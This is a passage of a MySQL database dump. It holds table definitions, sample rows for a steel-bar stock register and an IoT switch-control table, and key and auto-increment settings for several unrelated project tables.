INSERT INTO `stock_company_table` (`id`, `company_name`) VALUES
(1, 'Amba Shakti'),
(2, 'VMX'),
(3, 'MSP'),
(4, 'Rathi'),
(5, 'Sail'),
(6, 'Jai Bharat'),
(7, 'Jindal Panther'),
(8, 'Prime Gold'),
(9, 'Rashmi'),
(10, 'Steel Gold'),
(11, 'Wave'),
(12, 'Tata'),
(13, 'Kamdhanu'),
(14, 'J.S.W'),
(15, 'Paras'),
(16, 'SBF'),
(18, 'Jindal Plus'),
(19, 'Century'),
(20, 'SRMB'),
(21, 'RINL'),
(22, 'SKNK'),
(23, 'Gallat'),
(24, 'V-XEGA'),
(25, 'Barnala'),
(26, 'Electro'),
(27, 'Steel Max Rathi'),
(28, 'Vizag'),
(29, 'Metro'),
(30, 'Rana'),
(31, 'Anmol'),
(32, 'Indoster'),
(33, '7 Star'),
(34, 'Bahubali');

-- --------------------------------------------------------

--
-- Table structure for table `stock_management`
--

CREATE TABLE `stock_management` (
  `id` int(11) NOT NULL,
  `mm_no` varchar(200) NOT NULL,
  `mm_id` int(11) NOT NULL,
  `comp_id` int(11) NOT NULL,
  `company_name` varchar(200) NOT NULL,
  `quantity_cr` double NOT NULL,
  `quantity_dr` double NOT NULL,
  `reference_no` varchar(100) NOT NULL,
  `total_volume` double NOT NULL,
  `bill_id` varchar(10) NOT NULL,
  `bill_name` varchar(100) NOT NULL,
  `stk_cr_dr` varchar(10) NOT NULL,
  `date_` varchar(100) NOT NULL,
  `date_time` varchar(200) NOT NULL,
  `uniqueId` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `stock_management`
--

INSERT INTO `stock_management` (`id`, `mm_no`, `mm_id`, `comp_id`, `company_name`, `quantity_cr`, `quantity_dr`, `reference_no`, `total_volume`, `bill_id`, `bill_name`, `stk_cr_dr`, `date_`, `date_time`, `uniqueId`) VALUES
(2442, '8MM', 1, 33, '7 Star', 1, 0, 'xxx', 85, '', '', 'cr', '04-09-2023', '2023/09/04 17:11:20', '5a44096b-769d-488f-bf33-27cca61f8c59'),
(2443, '10MM', 2, 1, 'Amba Shakti', 10, 0, 'xxxx', 840, '', '', 'cr', '04-09-2023', '2023/09/04 17:11:51', '3fd847bc-48ed-4ae0-ad90-818275a79578'),
(2444, '10MM', 2, 1, 'Amba Shakti', 10, 0, 'fff', 850, '', '', 'cr', '04-09-2023', '2023/09/04 17:18:49', '1fba7563-f426-435f-b1e1-ed5087539576');

-- --------------------------------------------------------

--
-- Table structure for table `stock_management_payroll`
--

CREATE TABLE `stock_management_payroll` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `add_permissible` int(11) NOT NULL DEFAULT 0,
  `out_permissible` int(11) NOT NULL DEFAULT 0,
  `report_permissible` int(11) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `stock_management_user`
--

CREATE TABLE `stock_management_user` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `user_name` varchar(100) NOT NULL,
  `full_name` varchar(100) NOT NULL,
  `password_hash` varchar(255) NOT NULL,
  `salt` varchar(255) NOT NULL,
  `created_date` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `stock_mm_table`
--

CREATE TABLE `stock_mm_table` (
  `id` int(11) NOT NULL,
  `mm_no` varchar(100) NOT NULL,
  `weight` double NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `stock_mm_table`
--

INSERT INTO `stock_mm_table` (`id`, `mm_no`, `weight`) VALUES
(1, '8MM', 84),
(2, '10MM', 84),
(3, '12MM', 84),
(4, '16MM', 84),
(5, '20MM', 84),
(6, '25MM', 84),
(7, '28MM', 84),
(8, '32MM', 84);

-- --------------------------------------------------------

--
-- Table structure for table `switch_control`
--

CREATE TABLE `switch_control` (
  `id` int(11) NOT NULL,
  `switch_1` varchar(20) NOT NULL,
  `switch_2` varchar(20) NOT NULL,
  `switch_3` varchar(20) NOT NULL,
  `switch_4` varchar(20) NOT NULL,
  `switch_5` varchar(20) NOT NULL,
  `switch_6` varchar(20) NOT NULL,
  `switch_7` varchar(20) NOT NULL,
  `switch_8` varchar(20) NOT NULL,
  `switch_9` varchar(20) NOT NULL,
  `switch_10` varchar(20) NOT NULL,
  `switch_11` varchar(20) NOT NULL,
  `switch_12` varchar(20) NOT NULL,
  `switch_13` varchar(20) NOT NULL,
  `switch_14` varchar(20) NOT NULL,
  `switch_15` varchar(20) NOT NULL,
  `switch_16` varchar(20) NOT NULL,
  `switch_17` varchar(20) NOT NULL,
  `switch_18` varchar(20) NOT NULL,
  `switch_19` varchar(20) NOT NULL,
  `switch_20` varchar(20) NOT NULL,
  `switch_1_name` varchar(60) NOT NULL,
  `switch_2_name` varchar(60) NOT NULL,
  `switch_3_name` varchar(60) NOT NULL,
  `switch_4_name` varchar(60) NOT NULL,
  `switch_5_name` varchar(60) NOT NULL,
  `switch_6_name` varchar(60) NOT NULL,
  `switch_7_name` varchar(60) NOT NULL,
  `switch_8_name` varchar(60) NOT NULL,
  `switch_9_name` varchar(60) NOT NULL,
  `switch_10_name` varchar(60) NOT NULL,
  `switch_11_name` varchar(60) NOT NULL,
  `switch_12_name` varchar(60) NOT NULL,
  `switch_13_name` varchar(60) NOT NULL,
  `switch_14_name` varchar(60) NOT NULL,
  `switch_15_name` varchar(60) NOT NULL,
  `switch_16_name` varchar(60) NOT NULL,
  `switch_17_name` varchar(60) NOT NULL,
  `switch_18_name` varchar(60) NOT NULL,
  `switch_19_name` varchar(60) NOT NULL,
  `switch_20_name` varchar(60) NOT NULL,
  `userUniqueId` varchar(60) NOT NULL,
  `device_id` varchar(100) NOT NULL,
  `device_room_name` varchar(200) NOT NULL,
  `device_switch_no` varchar(60) NOT NULL,
  `date_time` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `switch_control`
--

INSERT INTO `switch_control` (`id`, `switch_1`, `switch_2`, `switch_3`, `switch_4`, `switch_5`, `switch_6`, `switch_7`, `switch_8`, `switch_9`, `switch_10`, `switch_11`, `switch_12`, `switch_13`, `switch_14`, `switch_15`, `switch_16`, `switch_17`, `switch_18`, `switch_19`, `switch_20`, `switch_1_name`, `switch_2_name`, `switch_3_name`, `switch_4_name`, `switch_5_name`, `switch_6_name`, `switch_7_name`, `switch_8_name`, `switch_9_name`, `switch_10_name`, `switch_11_name`, `switch_12_name`, `switch_13_name`, `switch_14_name`, `switch_15_name`, `switch_16_name`, `switch_17_name`, `switch_18_name`, `switch_19_name`, `switch_20_name`, `userUniqueId`, `device_id`, `device_room_name`, `device_switch_no`, `date_time`) VALUES
(40, 'HIGH', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'HIGH', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'HIGH', 'Switch 1', 'Switch 2', 'Switch 3', 'Switch 4', 'Switch 5', 'Switch 6', 'Switch 7', 'Switch 8', 'Switch 9', 'Switch 10', 'Switch 11', 'Switch 12', 'Switch 13', 'Switch 14', 'Switch 15', 'Switch 16', 'Switch 17', 'Switch 18', 'Switch 19', 'Switch 20', 'mskit61d42e2b6fb6b', 'ranwifi01', 'sssc', '4', '2022-01-04 18:00:59'),
(60, 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'HIGH', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'HIGH', 'Switch 1', 'Switch 2', 'Switch 3', 'Switch 4', 'Switch 5', 'Switch 6', 'Switch 7', 'Switch 8', 'Switch 9', 'Switch 10', 'Switch 11', 'Switch 12', 'Switch 13', 'Switch 14', 'Switch 15', 'Switch 16', 'Switch 17', 'Switch 18', 'Switch 19', 'Switch 20', 'qwet617512f0bd63a', 'ufo_123', 'egrg ff', '8', '2022-01-06 06:52:31'),
(63, 'HIGH', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'HIGH', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'LOW', 'HIGH', 'Switch 1', 'Switch 2', 'Switch 3', 'Switch 4', 'Switch 5', 'Switch 6', 'Switch 7', 'Switch 8', 'Switch 9', 'Switch 10', 'Switch 11', 'Switch 12', 'Switch 13', 'Switch 14', 'Switch 15', 'Switch 16', 'Switch 17', 'Switch 18', 'Switch 19', 'Switch 20', 'qwert6175142a40359', 'ranwifi01', 'ranojan', '4', '2024-12-06 11:05:09');

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `id` int(11) NOT NULL,
  `file_path` varchar(200) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`id`, `file_path`) VALUES
(10, 'img_dir/20200903_143721.jpg'),
(11, 'img_dir/20200911_101601.jpg'),
(12, 'img_dir/20201024_131353_01.jpg'),
(13, 'img_dir/20200920_205304.jpg'),
(14, 'img_dir/20200920_205326.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `score` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Table structure for table `user_relay_list`
--

CREATE TABLE `user_relay_list` (
  `id` int(11) NOT NULL,
  `userUniqueId` varchar(51) NOT NULL,
  `device_id` varchar(51) NOT NULL,
  `date_time` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `4stge_formation_pratique`
--
ALTER TABLE `4stge_formation_pratique`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `4stge_question`
--
ALTER TABLE `4stge_question`
  ADD PRIMARY KEY (`int`);

--
-- Indexes for table `4stge_question_category`
--
ALTER TABLE `4stge_question_category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `4stge_question_details`
--
ALTER TABLE `4stge_question_details`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `4stge_video_link_table`
--
ALTER TABLE `4stge_video_link_table`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `book_library_backup`
--
ALTER TABLE `book_library_backup`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `device_list_table`
--
ALTER TABLE `device_list_table`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `iot_table`
--
ALTER TABLE `iot_table`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ip_table`
--
ALTER TABLE `ip_table`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `licence_table`
--
ALTER TABLE `licence_table`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `androidID` (`androidID`);

--
-- Indexes for table `member`
--
ALTER TABLE `member`
  ADD PRIMARY KEY (`user_id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- Indexes for table `my_keylogger`
--
ALTER TABLE `my_keylogger`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `questions`
--
ALTER TABLE `questions`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `quiz`
--
ALTER TABLE `quiz`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `quiz_result`
--
ALTER TABLE `quiz_result`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `register`
--
ALTER TABLE `register`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rtm_control`
--
ALTER TABLE `rtm_control`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `rtm_device`
--
ALTER TABLE `rtm_device`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `stock_company_table`
--
ALTER TABLE `stock_company_table`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `stock_management`
--
ALTER TABLE `stock_management`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `stock_management_payroll`
--
ALTER TABLE `stock_management_payroll`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `stock_management_user`
--
ALTER TABLE `stock_management_user`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `stock_mm_table`
--
ALTER TABLE `stock_mm_table`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `switch_control`
--
ALTER TABLE `switch_control`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user`
--
ALTER TABLE `user`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_relay_list`
--
ALTER TABLE `user_relay_list`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `4stge_formation_pratique`
--
ALTER TABLE `4stge_formation_pratique`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `4stge_question`
--
ALTER TABLE `4stge_question`
  MODIFY `int` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `4stge_question_category`
--
ALTER TABLE `4stge_question_category`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `4stge_question_details`
--
ALTER TABLE `4stge_question_details`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `4stge_video_link_table`
--
ALTER TABLE `4stge_video_link_table`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `book_library_backup`
--
ALTER TABLE `book_library_backup`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `device_list_table`
--
ALTER TABLE `device_list_table`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT for table `iot_table`
--
ALTER TABLE `iot_table`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `ip_table`
--
ALTER TABLE `ip_table`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT for table `licence_table`
--
ALTER TABLE `licence_table`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=99;

--
-- AUTO_INCREMENT for table `member`
--
ALTER TABLE `member`
  MODIFY `user_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=63;

--
-- AUTO_INCREMENT for table `my_keylogger`
--
ALTER TABLE `my_keylogger`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=679;

--
-- AUTO_INCREMENT for table `questions`
--
ALTER TABLE `questions`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `quiz`
--
ALTER TABLE `quiz`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `quiz_result`
--
ALTER TABLE `quiz_result`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `register`
--
ALTER TABLE `register`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `rtm_control`
--
ALTER TABLE `rtm_control`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `rtm_device`
--
ALTER TABLE `rtm_device`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `stock_company_table`
--
ALTER TABLE `stock_company_table`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT for table `stock_management`
--
ALTER TABLE `stock_management`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2445;

--
-- AUTO_INCREMENT for table `stock_management_payroll`
--
ALTER TABLE `stock_management_payroll`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `stock_management_user`
--
ALTER TABLE `stock_management_user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `stock_mm_table`
--
ALTER TABLE `stock_mm_table`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `switch_control`
--
ALTER TABLE `switch_control`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=65;

--
-- AUTO_INCREMENT for table `user`
--
ALTER TABLE `user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `user_relay_list`
--
ALTER TABLE `user_relay_list`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
